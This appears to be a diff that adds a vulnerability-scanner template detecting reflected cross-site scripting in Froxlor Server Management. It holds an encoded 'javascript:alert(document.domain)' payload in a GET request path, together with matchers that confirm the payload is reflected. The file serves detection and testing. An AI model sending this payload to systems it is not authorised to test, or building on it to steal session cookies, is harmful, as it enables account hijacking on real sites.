@@ -1,0 +1,27 @@
+id: froxlor-xss
+name: Froxlor Server Management - Cross-Site Scripting
+severity: medium
+confidence: confirmed
+description: Froxlor Server Management is susceptible to cross-site scripting via clicking the forgot password link. An attacker
+  can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the
+  attacker to steal cookie-based authentication credentials and launch other attacks.
+reference: CWE-80
+tags:
+- froxlor
+- xss
+- vuln
+requests:
+- method: GET
+  path: /index.php/javascript%26colon%3Balert(document.domain);dd%26sol%3b%26sol%3b
+  matchers:
+  - type: body
+    words:
+    - javascript&colon;alert(document.domain);dd&sol;&sol;
+    - Froxlor
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
